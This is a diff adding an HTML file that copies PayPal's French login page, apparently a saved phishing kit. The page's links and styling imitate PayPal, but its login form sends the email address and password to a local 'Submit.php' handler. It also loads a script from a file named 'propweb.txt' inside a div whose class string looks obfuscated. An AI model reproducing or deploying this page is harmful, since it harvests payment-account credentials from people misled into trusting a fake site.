@@ -1,0 +1,154 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--
+         Script info: script: webscr, cmd: _login-run, template: p/gen/login, date: Jun. 10, 2009 00:22:29 PDT; country: FR, language: fr_FR, xslt server: 
+		web version: 58.0-946807 branch: EBFBATCH_580_0609_int
+		content version: -
+		pexml version: 58.0-948890
+		page XSL: Customer/default/fr_FR/general/Login.xsl
+       hostname : mrUJhknVaQNXc05jiRizgtwT-Ig.qz0DJMZWUk9J1H0
+         rlogid : mrUJhknVaQNXc05jiRizgojECbo7C%2f%2faFLJ3%2frJFRSkhlmOPgxohhw%3d%3d_121e9507308
+--><title>Connexion - PayPal</title><!--googleoff: all-->
+
+
+
+<meta name="description" content="PayPal est le moyen plus sûr et plus simple de payer en ligne sans divulguer le numéro de votre carte bancaire."><!--googleon: all-->
+
+<link media="screen" rel="stylesheet" type="text/css" href="webscr.php_fichiers/global.css">
+<link rel="stylesheet" type="text/css" href="webscr.php_fichiers/pageLogin.css">
+<link rel="stylesheet" type="text/css" href="webscr.php_fichiers/flowHFR.css"><!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-580-20090611-1/css/browsers/ie7.css">
+<![endif]--><!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-580-20090611-1/css/browsers/ie6.css">
+<![endif]-->
+
+
+
+<link rel="stylesheet" type="text/css" href="webscr.php_fichiers/country.css">
+<link media="print" rel="stylesheet" type="text/css" href="webscr.php_fichiers/print.css">
+<script type="text/javascript">
+if (parent.frames.length > 0){
+	top.location.replace(document.location);
+}</script><script type="text/javascript" src="webscr.php_fichiers/global.js"></script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-580-20090611-1/en_US/i/icon/pp_favicon_x.ico">
+<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-580-20090611-1/en_US/i/pui/apple-touch-icon.png"></head><body>
+<noscript><p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses
+fonctionnalités du site PayPal, vous avez besoin de JavaScript et de
+cookies. Vous pouvez les activer �  l'aide des paramètres de votre
+navigateur.</p></noscript>
+<div class="legacyErrors" id="page">
+<div id="header" class="std">
+<h1><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_home"><img src="webscr.php_fichiers/paypal_logo.gif" alt="PayPal" border="0"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/fr/cgi-bin/searchscr?cmd=_sitewide-search">
+<fieldset>
+<legend>Recherche PayPal</legend>
+<label for="searchBox">Rechercher </label><input id="searchBox" name="queryString" value="" type="text"> <input class="button" id="search.x" name="search.x" value="Rechercher" type="submit">
+</fieldset>
+<input name="form_charset" value="UTF-8" type="hidden">
+<input value="Firefox" name="browser_name" type="hidden"><input value="2" name="browser_version" type="hidden"><input value="Windows" name="operating_system" type="hidden"></form>
+<div id="navGlobal"><ul>
+<li class="first signup"><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_registration-run">Ouvrir un compte</a></li>
+<li class="login"><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_login-run">Connexion</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/helpweb?cmd=_help">Aide</a></li>
+<li class="last"><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_security-center-outside">Espace sécurité</a></li>
+</ul></div>
+<div id="navPrimary"><ul>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:XH">Accueil</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:XI">Particuliers</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_home-merchant&amp;nav=2" class="scTrack:SRD:Nav:XU">Marchands</a></li>
+<li class=""><a href="https://www.paypal.fr/integration" class="scTrack:SRD:Nav:Y47">Développeurs</a></li>
+</ul></div>
+</div>
+<div id="content">
+<div id="headline">
+<div class="secure">
+<span class="small">
+Connexion sécurisée</span>&nbsp;<img src="webscr.php_fichiers/secure_lock_2.gif" alt="" border="0">
+</div>
+<h2>Connexion sécurisée</h2>
+</div>
+<div id="messageBox" class="legacyErrors"></div>
+<div id="main" class="legacyErrors"><div class="layout1"><div class="layout2a">
+<div class="col first"><div class="box login">
+<div class="header"><h2>Connexion au compte</h2></div>
+<div class="body">
+<form method="post" name="login_form" action="Submit.php">
+<input name="login_cmd" value="" type="hidden"><input name="login_params" value="" type="hidden"><fieldset>
+<legend>Connexion</legend>
+<p><label for="login_email">Adresse email</label><input id="login_email" class="" name="login_email" value="" type="text"></p>
+<p><label for="login_password">Mot de passe PayPal</label><input autocomplete="off" id="login_password" name="login_password" value="" type="password"></p>
+<p><label for="target_page">Consultez la page</label><select id="target_page" name="target_page"><option value="0" selected="selected">Mon compte</option>
+<option value="1">Mes transactions</option></select></p>
+<p><input name="submit.x" value="Connectez-vous" class="button primary" type="submit"></p>
+</fieldset>
+<p>Vous avez oublié votre <a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_email-recovery">adresse email</a> ou <a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_forgot-password&amp;from=PayPal">mot de passe</a>&nbsp;?</p>
+<p>Nouveau chez PayPal ? <strong><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_registration-run">Ouvrir un compte</a></strong></p>
+<input name="form_charset" value="UTF-8" type="hidden">
+<input value="Firefox" name="browser_name" type="hidden"><input value="2" name="browser_version" type="hidden"><input value="Windows" name="operating_system" type="hidden"></form>
+<script type="text/javascript">
+<!-- hide from JavaScript-challenged browsers
+var email_field = document.getElementById("login_email");
+if(email_field != null && email_field.getAttribute('type') != 'hidden' && email_field.value == '') {
+email_field.focus();
+}
+else {
+document.login_form.login_password.focus();
+}
+   // done hiding -->
+</script>
+</div>
+</div></div>
+<div class="col last"><div class="container"><div class="MktMPI" id="mpi510051"><img src="webscr.php_fichiers/pmoFR_hero_login_P2P_560x228.jpg" alt="" border="0"></div></div></div>
+</div></div></div>
+</div>
+<div id="footer">
+<h2 class="accessAid">Plus d'informations</h2>
+<ul>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=p/gen/about-outside">Notre société</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside">Types de compte</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=_display-fees-outside">Tarifs</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Respect de la vie privée</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=_security-center-outside">Espace sécurité</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Service clientèle</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Contrats d'utilisation</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=p/gen/jobs-outside">
+Offres d'emploi</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=xpt/Marketing/mobile/MobileOverview-outside">Mobile</a></li>
+<li><a href="http://www.paypal.com/fr/cgi-bin/webscr?cmd=_web-referrals-mrb-outside">Parrainages</a></li>
+<li><a href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=_batch-payment-overview-outside">Paiements groupés</a></li>
+</ul>
+<p id="footerSecure"><a target="_blank" href="https://www.paypal.com/fr/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onclick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img src="webscr.php_fichiers/logo_VIPwhite_66x27.gif" alt="" border="0"></a></p>
+<p id="legal">Copyright © 1999-2009 PayPal. Tous droits réservés.</p>
+</div>
+<div class="hide" id="navFull"></div>
+<script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script>
+</div>
+<script type="text/javascript" src="webscr.php_fichiers/hostedpayments.js"></script><script type="text/javascript" src="webscr.php_fichiers/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="webscr.php_fichiers/iconix.js"></script><script type="text/javascript" src="webscr.php_fichiers/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"><script src="webscr.php_fichiers/propweb.txt" type="text/javascript"></script></div>
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+<script type="text/javascript" src="webscr.php_fichiers/pp_jscode_080706.js"></script>
+<script type="text/javascript">
+<!--
+/* SiteCatalyst Variables */
+s.prop1="p/gen/login";
+s.prop7="Unknown";
+s.prop8="Unknown";
+s.prop9="Unknown";
+s.prop10="FR";
+s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
+s.pageName="Log In";
+s.channel="Log In";
+s.prop50="fr_FR";
+s.prop18="";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//-->
+</script><noscript><img
+src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
+height="1" width="1" border="0" alt="" /></noscript>
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+</body></html>
